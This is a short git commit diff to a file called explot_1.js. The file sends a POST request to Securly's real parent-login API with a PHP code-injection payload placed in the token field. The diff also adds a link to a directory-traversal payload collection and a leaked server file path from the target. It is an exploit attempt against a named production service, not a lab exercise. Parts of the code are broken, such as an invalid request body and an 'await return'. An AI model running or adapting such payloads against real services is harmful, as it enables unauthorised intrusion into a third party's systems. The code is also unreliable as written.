7cd065f20899b760e0d4d705d4a00aefab610245
SithLor <84148006+SithLor@users.noreply.github.com>
2024-03-19 18:44:33 +0000

    Fix API request body in explot_1.js

--- explot_1.js
+++ explot_1.js
@@ -6,16 +6,18 @@
 //}).done(function(html) {
 //    console.log(html);
 //})
-
+//https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#unc-bypass
+///var/www_shared/library/Securly/SSO.php:62:string '' (length=0)
 const e = fetch("https://securly.com/parents/api/requestLogin", {
     method: "POST",
-    body: JSON.stringify({token:'<?php echo "pwned"?>',password:"adcd"}),
+    body: {token:'<?php echo "pwned"?>',password:"adcd"},
     headers: {
         "Content-Type": "application/json"
     }
 }).then(async (res) => {
     console.log(res);
-    // Unpack the body stream
-    await return res.json();
+    // Unpack the body Stream
+   // const body = await res.text();
+   // console.log(body);
 
 });
